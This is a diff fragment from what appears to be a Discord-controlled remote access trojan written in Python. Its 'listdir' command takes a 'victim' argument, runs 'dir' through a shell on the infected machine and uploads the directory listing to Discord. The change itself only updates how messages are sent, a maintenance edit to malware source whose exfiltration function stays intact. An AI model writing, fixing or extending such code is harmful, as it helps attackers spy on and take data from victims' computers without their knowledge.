@@ -284,13 +284,13 @@ async def listdir(ctx, victim, directory_to_find="null"):
             subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         else:
             try: os.chdir(directory_to_find)
-            except: return await ctx.send(embed=Embed(title="Invalid directory! Please try again :)"))
+            except: return await ctx.followup.send(embed=Embed(title="Invalid directory! Please try again :)"))
             subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
         file = discord.File(
             os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
         )
-        await ctx.response.send_message("Contents of dir " + directory_to_find + " are:", file=file)
+        await ctx.followup.send("Contents of dir " + directory_to_find + " are:", file=file)
         os.remove(nr_working + "\\dir.txt")
         os.chdir(original_dir)
 
